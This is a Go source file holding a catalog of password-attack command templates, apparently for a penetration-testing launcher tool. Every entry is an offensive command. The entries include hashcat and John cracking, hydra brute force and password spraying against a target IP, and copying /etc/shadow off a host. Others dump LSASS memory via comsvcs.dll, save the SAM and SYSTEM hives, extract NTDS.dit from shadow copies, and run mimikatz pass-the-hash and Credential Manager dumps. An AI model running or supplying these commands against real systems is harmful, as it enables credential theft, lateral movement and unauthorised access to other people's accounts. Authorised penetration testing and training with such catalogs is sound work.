package main

// passwordCatalog holds password cracking, brute-force, and local credential
// hunting commands. Commands that already appear in another catalog (netexec,
// secretsdump, evil-winrm, smbclient, xfreerdp, hashcat ticket cracking) are
// intentionally not repeated here.
var passwordCatalog = []Tool{
	// ── Hash identification ────────────────────────────────────────────────
	{
		Name: "hashid: hashcat mode", Binary: "hashid -m {HASH}", Category: "identify",
		Desc:  "Guess the hash type and print its hashcat mode",
		Flags: []Flag{pwFlag("{HASH}", "Hash", "$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1", "Hash string to identify")},
	},
	{
		Name: "hashid: john format", Binary: "hashid -j {HASH}", Category: "identify",
		Desc:  "Guess the hash type and print its John the Ripper format",
		Flags: []Flag{pwFlag("{HASH}", "Hash", "193069ceb0461e1d40d216e32c79c704", "Hash string to identify")},
	},
	{
		Name: "hashcat: list hash modes", Binary: "hashcat --help", Category: "identify",
		Desc: "Show every hashcat hash mode and its ID",
	},

	// ── Hashcat cracking ───────────────────────────────────────────────────
	{
		Name: "hashcat: wordlist (-m)", Binary: "hashcat -a 0 -m {MODE} {HASH_FILE} {WORDLIST}", Category: "hashcat",
		Desc: "Dictionary attack against a hash file with a chosen mode",
		Flags: []Flag{
			pwFlag("{MODE}", "Hash mode", "0", "hashcat -m ID (0 = MD5, 1000 = NTLM)"),
			pwFlag("{HASH_FILE}", "Hash file", "hashes.txt", "File of hashes of one type"),
			pwFlag("{WORDLIST}", "Wordlist", "/usr/share/wordlists/rockyou.txt", "Dictionary file"),
		},
	},
	{
		Name: "hashcat: wordlist + rules", Binary: "hashcat -a 0 -m {MODE} {HASH_FILE} {WORDLIST} -r {RULE}", Category: "hashcat",
		Desc: "Dictionary attack with rule mutations (best64 is a good default)",
		Flags: []Flag{
			pwFlag("{MODE}", "Hash mode", "0", "hashcat -m ID"),
			pwFlag("{HASH_FILE}", "Hash file", "hashes.txt", "File of hashes of one type"),
			pwFlag("{WORDLIST}", "Wordlist", "/usr/share/wordlists/rockyou.txt", "Dictionary file"),
			pwFlag("{RULE}", "Rule file", "/usr/share/hashcat/rules/best64.rule", "Hashcat rule file"),
		},
	},
	{
		Name: "hashcat: single hash (--show)", Binary: "hashcat -m {MODE} {HASH} {WORDLIST} --show", Category: "hashcat",
		Desc: "Crack one hash and print the result from the potfile",
		Flags: []Flag{
			pwFlag("{MODE}", "Hash mode", "1000", "hashcat -m ID"),
			pwFlag("{HASH}", "Hash", "64f12cddaa88057e06a81b54e73b949b", "Single hash"),
			pwFlag("{WORDLIST}", "Wordlist", "/usr/share/wordlists/rockyou.txt", "Dictionary file"),
		},
	},
	{
		Name: "hashcat: mutation rules to stdout", Binary: "hashcat --force {WORDLIST} -r {RULE} --stdout > mut_password.list", Category: "hashcat",
		Desc: "Generate a rule-mutated wordlist without cracking anything",
		Flags: []Flag{
			pwFlag("{WORDLIST}", "Base wordlist", "password.list", "Words to mutate"),
			pwFlag("{RULE}", "Rule file", "custom.rule", "Hashcat rule file"),
		},
	},
	{
		Name: "hashcat: sha512crypt (unshadow)", Binary: "hashcat -m 1800 -a 0 {HASH_FILE} {WORDLIST} -o unshadowed.cracked", Category: "hashcat",
		Desc: "Crack unshadowed Linux hashes ($6$) and write results to a file",
		Flags: []Flag{
			pwFlag("{HASH_FILE}", "Unshadowed file", "/tmp/unshadowed.hashes", "Output from unshadow"),
			pwFlag("{WORDLIST}", "Wordlist", "rockyou.txt", "Dictionary file"),
		},
	},
	{
		Name: "hashcat: DCC2 (mscash2)", Binary: "hashcat -m 2100 '{HASH}' {WORDLIST}", Category: "hashcat",
		Desc: "Crack domain cached credentials (DCC2 / mscash2)",
		Flags: []Flag{
			pwFlag("{HASH}", "DCC2 hash", "$DCC2$10240#user#hash", "Full DCC2 string"),
			pwFlag("{WORDLIST}", "Wordlist", "/usr/share/wordlists/rockyou.txt", "Dictionary file"),
		},
	},
	{
		Name: "hashcat: BitLocker (22100)", Binary: "hashcat -m 22100 {HASH_FILE} {WORDLIST} -o backup.cracked", Category: "hashcat",
		Desc: "Crack BitLocker hashes extracted from a VHD",
		Flags: []Flag{
			pwFlag("{HASH_FILE}", "Hash file", "backup.hashes", "From bitlocker2john"),
			pwFlag("{WORDLIST}", "Wordlist", "rockyou.txt", "Dictionary file"),
		},
	},

	// ── John the Ripper ────────────────────────────────────────────────────
	{
		Name: "john: wordlist", Binary: "john --wordlist={WORDLIST} {HASH_FILE}", Category: "john",
		Desc: "Dictionary attack with John the Ripper",
		Flags: []Flag{
			pwFlag("{WORDLIST}", "Wordlist", "rockyou.txt", "Dictionary file"),
			pwFlag("{HASH_FILE}", "Hash file", "hash.txt", "Hash file from a *2john tool"),
		},
	},
	{
		Name: "john: single crack mode", Binary: "john --single {PASSWD_FILE}", Category: "john",
		Desc:  "Guess passwords from the GECOS fields of a passwd file",
		Flags: []Flag{pwFlag("{PASSWD_FILE}", "passwd file", "passwd", "Unshadowed passwd-style file")},
	},
	{
		Name: "john: incremental", Binary: "john --incremental {HASH_FILE}", Category: "john",
		Desc:  "Brute force using John's incremental (character set) mode",
		Flags: []Flag{pwFlag("{HASH_FILE}", "Hash file", "hash.txt", "Hash file")},
	},
	{
		Name: "john: show cracked", Binary: "john --show {HASH_FILE}", Category: "john",
		Desc:  "Print passwords John has already cracked",
		Flags: []Flag{pwFlag("{HASH_FILE}", "Hash file", "hash.txt", "Hash file")},
	},
	{
		Name: "john: incremental charsets", Binary: "grep '# Incremental modes' -A 100 /etc/john/john.conf", Category: "john",
		Desc: "List John's built-in incremental charset definitions",
	},

	// ── Hash extraction (*2john) ───────────────────────────────────────────
	{
		Name: "ssh2john: key → hash", Binary: "python3 ssh2john.py {KEY_FILE} > ssh.hash", Category: "hash extraction",
		Desc:  "Convert an encrypted SSH private key into a crackable hash",
		Flags: []Flag{pwFlag("{KEY_FILE}", "Private key", "id_rsa", "Encrypted SSH key")},
	},
	{
		Name: "zip2john: zip → hash", Binary: "zip2john {ZIP} > zip.hash", Category: "hash extraction",
		Desc:  "Convert a password-protected zip into a crackable hash",
		Flags: []Flag{pwFlag("{ZIP}", "Zip file", "archive.zip", "Protected zip")},
	},
	{
		Name: "office2john: docx → hash", Binary: "office2john.py {DOC} > office.hash", Category: "hash extraction",
		Desc:  "Convert a password-protected Office document into a crackable hash",
		Flags: []Flag{pwFlag("{DOC}", "Document", "protected.docx", "Protected Office file")},
	},
	{
		Name: "pdf2john: pdf → hash", Binary: "pdf2john.pl {PDF} > pdf.hash", Category: "hash extraction",
		Desc:  "Convert a password-protected PDF into a crackable hash",
		Flags: []Flag{pwFlag("{PDF}", "PDF", "file.pdf", "Protected PDF")},
	},
	{
		Name: "bitlocker2john: VHD → hashes", Binary: "bitlocker2john -i {VHD} > backup.hashes", Category: "hash extraction",
		Desc:  "Pull BitLocker hashes from a VHD/VHDX image",
		Flags: []Flag{pwFlag("{VHD}", "VHD image", "Backup.vhd", "BitLocker volume image")},
	},
	{
		Name: "locate *2john* scripts", Binary: "locate *2john*", Category: "hash extraction",
		Desc: "Find every installed *2john helper script",
	},

	// ── Online brute force ─────────────────────────────────────────────────
	{
		Name: "hydra: user + password lists", Binary: "hydra -L {USER_LIST} -P {PASS_LIST} {SERVICE}://{IP}", Category: "brute force",
		Desc: "Try every username against every password on a network service",
		Flags: []Flag{
			pwFlag("{USER_LIST}", "User list", "users.list", "One username per line"),
			pwFlag("{PASS_LIST}", "Password list", "passwords.list", "One password per line"),
			pwFlag("{SERVICE}", "Service", "ssh", "e.g. ssh, smb, rdp, ftp"),
			pwFlag("{IP}", "Target IP", "10.10.10.10", "Target host"),
		},
	},
	{
		Name: "hydra: single user", Binary: "hydra -l {USER} -P {PASS_LIST} {SERVICE}://{IP}", Category: "brute force",
		Desc: "Brute force one known username against a network service",
		Flags: []Flag{
			pwFlag("{USER}", "Username", "admin", "Known username"),
			pwFlag("{PASS_LIST}", "Password list", "passwords.list", "One password per line"),
			pwFlag("{SERVICE}", "Service", "ssh", "e.g. ssh, smb, rdp, ftp"),
			pwFlag("{IP}", "Target IP", "10.10.10.10", "Target host"),
		},
	},
	{
		Name: "hydra: single password", Binary: "hydra -L {USER_LIST} -p {PASS} {SERVICE}://{IP}", Category: "brute force",
		Desc: "Password spray one password across many usernames",
		Flags: []Flag{
			pwFlag("{USER_LIST}", "User list", "users.list", "One username per line"),
			pwFlag("{PASS}", "Password", "Summer2026!", "Password to spray"),
			pwFlag("{SERVICE}", "Service", "ssh", "e.g. ssh, smb, rdp, ftp"),
			pwFlag("{IP}", "Target IP", "10.10.10.10", "Target host"),
		},
	},
	{
		Name: "hydra: credential stuffing", Binary: "hydra -C {CRED_LIST} ssh://{IP}", Category: "brute force",
		Desc: "Test user:password pairs from one file over SSH",
		Flags: []Flag{
			pwFlag("{CRED_LIST}", "Credential list", "user_pass.list", "user:password per line"),
			pwFlag("{IP}", "Target IP", "10.10.10.10", "Target host"),
		},
	},

	// ── Linux local credentials ────────────────────────────────────────────
	{
		Name: "unshadow: passwd + shadow", Binary: "unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes", Category: "linux creds",
		Desc: "Combine passwd and shadow copies into one file for cracking",
	},
	{
		Name: "linux: copy passwd/shadow", Binary: "sudo cp /etc/passwd /tmp/passwd.bak && sudo cp /etc/shadow /tmp/shadow.bak", Category: "linux creds",
		Desc: "Copy passwd and shadow so they can be moved off the box for cracking",
	},
	{
		Name: "linux: opasswd history", Binary: "sudo cat /etc/security/opasswd", Category: "linux creds",
		Desc: "Read old password hashes kept for password history",
	},
	{
		Name: "lazagne: all modules", Binary: "sudo python3 laZagne.py all", Category: "linux creds",
		Desc: "Recover stored credentials from common apps and browsers",
	},
	{
		Name: "mimipenguin", Binary: "sudo python3 mimipenguin.py", Category: "linux creds",
		Desc: "Dump cleartext credentials from memory on Linux",
	},
	{
		Name: "firefox_decrypt", Binary: "python3 firefox_decrypt.py", Category: "linux creds",
		Desc: "Decrypt saved Firefox logins using the local profile",
	},

	// ── Windows local credentials ──────────────────────────────────────────
	{
		Name: "reg: save SAM/SYSTEM/SECURITY", Binary: `reg.exe save hklm\sam C:\sam.save && reg.exe save hklm\system C:\system.save && reg.exe save hklm\security C:\security.save`, Category: "windows creds",
		Desc: "Copy the SAM, SYSTEM, and SECURITY hives for offline secrets extraction",
	},
	{
		Name: "rundll32: LSASS minidump", Binary: `rundll32 C:\windows\system32\comsvcs.dll, MiniDump {PID} C:\lsass.dmp full`, Category: "windows creds",
		Desc:  "Write a full LSASS memory dump using the built-in comsvcs.dll",
		Flags: []Flag{pwFlag("{PID}", "LSASS PID", "672", "From tasklist or Get-Process lsass")},
	},
	{
		Name: "pypykatz: parse LSASS dump", Binary: "pypykatz lsa minidump {DUMP}", Category: "windows creds",
		Desc:  "Extract credentials and hashes from an offline LSASS dump",
		Flags: []Flag{pwFlag("{DUMP}", "Dump file", "lsass.dmp", "LSASS minidump file")},
	},
	{
		Name: "vssadmin: shadow copy C:", Binary: "vssadmin CREATE SHADOW /For=C:", Category: "windows creds",
		Desc: "Create a volume shadow copy so locked files like NTDS.dit can be copied",
	},
	{
		Name: "copy NTDS.dit from shadow copy", Binary: `cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy{N}\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit`, Category: "windows creds",
		Desc:  "Copy NTDS.dit out of an existing shadow copy",
		Flags: []Flag{pwFlag("{N}", "Shadow copy #", "2", "HarddiskVolumeShadowCopy number")},
	},
	{
		Name: "cmdkey: list stored creds", Binary: "cmdkey /list", Category: "windows creds",
		Desc: "List credentials saved in the current user's Credential Manager",
	},
	{
		Name: "runas: use saved credential", Binary: "runas /savecred /user:{USER} cmd", Category: "windows creds",
		Desc:  "Launch cmd as a user whose credentials are saved",
		Flags: []Flag{pwFlag("{USER}", "Username", "DOMAIN\\user", "Saved account")},
	},
	{
		Name: "mimikatz: credman", Binary: `mimikatz.exe privilege::debug "sekurlsa::credman" exit`, Category: "windows creds",
		Desc: "Dump Credential Manager entries from memory",
	},
	{
		Name: "mimikatz: pass-the-hash", Binary: `mimikatz.exe privilege::debug "sekurlsa::pth /user:{USER} /rc4:{HASH} /domain:{DOMAIN} /run:cmd.exe" exit`, Category: "windows creds",
		Desc: "Spawn a process as a user with their NT hash",
		Flags: []Flag{
			pwFlag("{USER}", "Username", "Administrator", "Account"),
			pwFlag("{HASH}", "NT hash", "64f12cddaa88057e06a81b54e73b949b", "NTLM hash"),
			pwFlag("{DOMAIN}", "Domain", "corp.local", "Domain or ."),
		},
	},

	// ── Searching for credentials ──────────────────────────────────────────
	{
		Name: "findstr: search files for password", Binary: `findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml`, Category: "credential search",
		Desc: "Search common config and script types for the word password",
	},
	{
		Name: "snaffler: shares", Binary: "snaffler.exe -s", Category: "credential search",
		Desc: "Find interesting files and credentials across network shares",
	},
	{
		Name: "HuntSMBShares: shares", Binary: `Invoke-HuntSMBShares -Threads 100 -OutputDirectory {OUT_DIR}`, Category: "credential search",
		Desc:  "PowerShell share crawler that saves results to a directory",
		Flags: []Flag{pwFlag("{OUT_DIR}", "Output dir", `c:\Users\Public`, "Where to write results")},
	},
	{
		Name: "pcredz: pcap credentials", Binary: "./Pcredz -f {PCAP} -t -v", Category: "credential search",
		Desc:  "Extract credentials from a packet capture",
		Flags: []Flag{pwFlag("{PCAP}", "Capture", "demo.pcapng", "pcap or pcapng file")},
	},

	// ── Wordlist generation ────────────────────────────────────────────────
	{
		Name: "cewl: site wordlist", Binary: "cewl {URL} -d 4 -m 6 --lowercase -w {OUT}", Category: "wordlists",
		Desc: "Build a custom wordlist from words on a website",
		Flags: []Flag{
			pwFlag("{URL}", "URL", "https://example.com", "Site to crawl"),
			pwFlag("{OUT}", "Output file", "custom.wordlist", "Wordlist to write"),
		},
	},
	{
		Name: "username-anarchy: names → usernames", Binary: "./username-anarchy -i {NAMES_FILE}", Category: "wordlists",
		Desc:  "Generate likely usernames from a list of first and last names",
		Flags: []Flag{pwFlag("{NAMES_FILE}", "Names file", "names.txt", "First and last names")},
	},
}

func pwFlag(placeholder, name, example, desc string) Flag {
	return Flag{Flag: placeholder, Name: name, Kind: KindString, Required: true,
		Placeholder: example, Desc: desc}
}
